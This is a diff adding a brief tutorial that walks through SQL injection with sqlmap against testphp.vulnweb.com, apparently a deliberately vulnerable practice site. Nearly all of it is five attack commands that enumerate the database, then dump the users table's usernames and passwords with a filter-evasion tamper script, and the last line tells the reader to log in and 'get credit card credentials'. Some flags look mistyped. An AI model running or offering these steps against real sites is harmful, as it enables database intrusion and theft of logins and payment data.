@@ -1,0 +1,9 @@
+Open http://testphp.vulnweb.com in kali linux
+Open artists and select anyone
+Use these 5 commands in terminal in kali
+1)sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -dbs --tamper=space2comment
+2)sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables --tamper=space2comment                                                                                                                                                                                                                
+3)sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -columns --tamper=space2comment
+4) sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname -dump --tamper=space2comment
+5) sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass -dump --tamper=space2comment
+ last 2 commands will give u password and username , use them to login in above test website and get credit card credentials
